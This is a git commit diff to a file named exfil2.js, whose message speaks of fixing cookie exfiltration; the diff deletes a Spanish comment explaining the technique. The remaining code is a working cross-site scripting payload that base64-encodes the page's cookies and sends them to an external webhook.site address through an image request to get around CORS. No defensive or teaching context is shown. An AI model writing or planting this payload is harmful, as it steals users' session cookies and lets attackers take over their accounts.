800c50ef48bd339237fb6b027346f8cdc262daac
Luizxz <118949863+Liuz94@users.noreply.github.com>
2026-07-26 22:06:26 -0500

    Fix image source assignment for cookie exfiltration

--- exfil2.js
+++ exfil2.js
@@ -1,3 +1,2 @@
-// Codifica la cookie en base64 y la envía como imagen (bypass CORS)
 var x = new Image();
 x.src = "https://webhook.site/bece384c-6c1c-4e4f-88c3-b2904037892e?data=" + btoa(document.cookie);
